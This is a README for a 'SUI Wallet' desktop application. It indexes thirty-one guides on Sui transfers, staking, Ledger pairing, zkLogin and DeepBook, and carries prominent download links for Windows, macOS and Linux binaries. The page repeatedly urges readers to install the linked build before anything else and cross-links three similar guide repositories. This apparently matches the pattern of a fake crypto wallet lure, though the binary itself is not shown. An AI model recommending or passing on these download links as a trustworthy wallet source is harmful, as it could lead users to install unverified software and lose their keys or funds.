![SUI Wallet](assets/banner-hub.png)

# SUI Wallet transfers, staking and sign-in

Thirty-one guides for moving value, reading fees, staking, pairing Ledger, signing in with zkLogin and trading on DeepBook.

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-4DA2FF?style=for-the-badge&labelColor=0D1117)](#license) [![Latest release: v0.2.6](https://img.shields.io/badge/RELEASE-v0.2.6-1F6FEB?style=for-the-badge&labelColor=0D1117)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/tag/v0.2.6)

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## What this repository is for

Thirty-one guides, and the largest of the three repositories, because this is where a wallet stops being an install and starts being used. Everything here assumes a running application, a recorded recovery phrase and an account with something in it.

The first group covers value moving between addresses: sending and receiving SUI, finding the address to give someone, reading a fee before signing, and what a pending transaction is actually waiting for. The second covers objects rather than balances, because Sui NFTs and SuiNS names are owned objects with their own behaviour, and an NFT transfer is a transaction with an object as its payload rather than a balance adjustment.

The third group is staking, which is the part of Sui most readers arrive already curious about: delegation from the app, choosing a validator on commission and uptime, reading an APY as a network rate rather than a promise, claiming rewards that accrue inside the position, and unstaking against an epoch boundary that does not care when you clicked. Liquid staking through Haedal sits beside it, because it changes what the stake is while the delegation stays put.

The last group is custody and identity at the edges: pairing a Ledger, the four reasons a device is not detected, zkLogin accounts that have no phrase at all, DeepBook orders that settle on chain, and the one page in this account that compares wallet products by name.

## Who it is for

- A reader whose transfer left the wallet and has not arrived, and who wants to know whether to wait, retry or worry.
- Someone staking for the first time who cannot tell why the balance did not change at the next epoch.
- A user pairing a hardware key, or signing in with a Google account instead of a phrase.
- Anyone trading on DeepBook, bridging from an EVM chain, or deciding which desktop wallet to use.

## Start here

1. [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) - Address, amount, fee, approval: the four things to check before a transfer leaves.
2. [Finding your SUI Wallet address](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/finding-your-sui-wallet-address.md) - The address is the account, and the app shows it in more than one place.
3. [Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) - Delegation happens inside the app; the stake stays yours while it earns.
4. [Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) - The approval screen is the last place a bad transaction can be stopped.

## How to use these guides

1. Read the approval page before your first transaction, not after a bad one. The preview screen is the last place a transaction can be stopped, and it only helps a reader who knows what to look for.
2. Keep the digest. Every transaction produces one, and it is how the pending page, the balance page and any explorer agree about what happened.
3. Treat the epoch as a clock. Staking and unstaking both complete at a boundary, so a position can look stuck for reasons that have nothing to do with the wallet.
4. Pair the hardware key before funding the account it holds. A Ledger-backed account that is already funded makes every detection problem more expensive than it needs to be.
5. Use the comparison page last. It exists for a reader choosing a wallet, and the thirty pages before it are written for a reader who has already chosen this one.

## The guides grouped

| Guide | What it answers |
| --- | --- |
| [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) | Send SUI to another address and read the preview that appears before you approve the transfer. |
| [Receiving SUI into your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/receiving-sui-into-your-wallet.md) | Share the right address to receive SUI and confirm a deposit that has arrived on chain. |
| [SUI Wallet transaction fees explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-transaction-fees-explained.md) | Explain how Sui gas fees are calculated and priced for a transfer, a stake or a contract call. |
| [Why is my Sui transaction pending?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/why-is-my-sui-transaction-pending.md) | Read a pending transaction through its digest and decide whether to wait, retry or check the network. |
| [Finding your SUI Wallet address](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/finding-your-sui-wallet-address.md) | Locate the receiving address in the wallet and confirm it matches the account you mean to use. |
| [SUI Wallet balance not updating](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-balance-not-updating.md) | Refresh a balance that has not moved and check the same address on chain before assuming a loss. |
| [Viewing NFTs in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/viewing-nfts-in-sui-wallet.md) | Find the NFT objects held by an account and understand why some do not appear in the list. |
| [Sending NFTs from SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sending-nfts-from-sui-wallet.md) | Transfer a Sui NFT object to another address and confirm the object left the sending account. |
| [SUI Wallet and SuiNS names](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-suins-names-explained.md) | Explain what a SuiNS name resolves to and when a wallet will accept one in place of an address. |
| [Connecting SUI Wallet to a dApp](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/connecting-sui-wallet-to-a-dapp.md) | Connect the wallet to a Sui application, read the permission request, and disconnect when finished. |
| [Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) | Read a signature request before approving it and understand what revoking a connection does and does not do. |
| [Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) | Delegate SUI to a validator from the wallet, track the position, and know when rewards become spendable. |
| [Choosing a Sui validator](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/choosing-a-sui-validator.md) | Compare validators on the figures the wallet shows before committing a stake to one of them. |
| [SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) | Read a Sui staking APY correctly and separate the headline rate from what a position actually earns. |
| [Claiming SUI staking rewards](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/claiming-sui-staking-rewards.md) | Claim accumulated staking rewards and understand why the balance does not grow at every epoch. |
| [Unstaking SUI and epoch timing](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/unstaking-sui-and-epoch-timing.md) | Unstake a position and plan around the epoch boundary at which the principal becomes available. |
| [Liquid staking SUI with Haedal](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/liquid-staking-sui-with-haedal.md) | Stake through Haedal, hold the liquid token it returns, and understand what stands behind the token. |
| [Staking SUI from a Ledger account](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-from-a-ledger-account.md) | Delegate from a Ledger-backed account, with the approval happening on the device rather than the screen. |
| [Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) | Pair a Ledger device with the wallet and confirm the account that appears is the one on the device. |
| [Ledger not detected in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/ledger-not-detected-in-sui-wallet.md) | Work through a Ledger the wallet cannot see, from the cable to the Sui app installed on the device. |
| [Installing the Sui app on Ledger](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/installing-the-sui-app-on-ledger.md) | Install the Sui application on a Ledger device and confirm the wallet recognises it afterwards. |
| [What is zkLogin in SUI Wallet?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/what-is-zklogin-in-sui-wallet.md) | Explain how zkLogin builds a Sui address from an OAuth identity and what that means for recovery. |
| [Signing in to SUI Wallet with Google](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/signing-in-to-sui-wallet-with-google.md) | Sign in with a Google identity and understand which part of the account the provider can and cannot see. |
| [Recovering a zkLogin SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/recovering-a-zklogin-sui-wallet.md) | Recover a zkLogin account from its provider identity and salt, and see why a phrase will not do it. |
| [Trading on DeepBook from SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/trading-on-deepbook-from-sui-wallet.md) | Place a DeepBook order from the wallet and read the settlement that follows on chain. |
| [Moving assets between EVM chains and Sui](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/moving-assets-between-evm-and-sui.md) | Move value between an EVM chain and Sui and understand where the trust sits in that route. |
| [Listing an NFT on the Sui marketplace](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/listing-an-nft-on-the-sui-marketplace.md) | List a Sui NFT for sale and understand what the marketplace contract holds while the listing is open. |
| [Understanding the Sui blockchain](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/understanding-the-sui-blockchain.md) | Explain the Sui blockchain in the terms a wallet user needs: objects, epochs, gas and finality. |
| [How to buy SUI and store it](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-buy-sui-and-store-it.md) | Acquire SUI and move it into a self-custody wallet without leaving it on an exchange account. |
| [SUI tokenomics and the unlock schedule](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-tokenomics-and-unlock-schedule.md) | Read the SUI supply and unlock schedule as background for a holding decision, with no prediction attached. |
| [Choosing the best Sui wallet for desktop](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/choosing-the-best-sui-wallet-for-desktop.md) | Compare the desktop wallet options for Sui on features a reader can check, and match each to a need. |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Send value | [How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) | A signed transfer whose effect was read on the preview screen before the approval was given. |
| Understand a pending transfer | [Why is my Sui transaction pending?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/why-is-my-sui-transaction-pending.md) | A digest checked against the network, and a decision about waiting that rests on evidence. |
| Delegate a stake | [Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) | A position delegated to a chosen validator, with rewards accruing inside it rather than arriving as deposits. |
| Read the rate honestly | [SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) | An APY understood as a moving network rate, separated from what a position actually earns. |
| Keep keys on a device | [Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) | An account that signs on the hardware device, with the wallet holding only the public note. |
| Sign in without a phrase | [What is zkLogin in SUI Wallet?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/what-is-zklogin-in-sui-wallet.md) | A zkLogin account built from an identity provider, with the salt treated as the thing to keep. |

## Common first questions

### Why did my staking balance not grow after an epoch?

Native rewards accrue inside the position and return with the principal on unstake, so the spendable balance is the wrong place to look. The claiming page shows where the rewards sit.

### Where do I find my address to receive SUI?

The wallet shows the account address in more than one place, and any of them is the receiving address. What matters is that the account shown is the one you mean to use.

### Is a Sui transaction lost while it is pending?

Not usually. Pending means the network has not finalised it yet, and the digest is what tells you whether it is still in flight or already settled.

### Can I recover a zkLogin account with a recovery phrase?

No. A zkLogin account has no exportable private key and no phrase; its recovery is the provider identity plus the salt it was created with, which is why the recovery page leads with the salt.

## Before you install

Everything in this repository assumes the current release. A wallet on an older build is the first thing to rule out before working through a transfer or a staking problem, because that is where the reported bugs have been fixed.

Staking and trading both spend real value and both settle on chain. Read the approval page once before either, and check the fee line on every preview rather than on the first one only.

## About

This repository holds one of three guide sets published from the same account. The others are [install and repair](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting), [keys and login](https://github.com/sui-blockchain-wallet/key-safety-and-login) and [transfers and staking](https://github.com/sui-blockchain-wallet/onchain-transfer-guides), with [the profile repository](https://github.com/sui-blockchain-wallet) as the index.

The wallet is actively maintained. The release linked at the top of this page is the build these guides describe, and the release page is the only distribution channel this project uses.

## License

Apache License 2.0. A copy ships at the root of this repository, and the full text also sits in the application repository's [licence file](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/blob/HEAD/LICENSE).

---

SUI Wallet is a self-custody desktop wallet for Sui. Nothing on this page is investment advice, and no rate, return or unlock figure is a forecast.
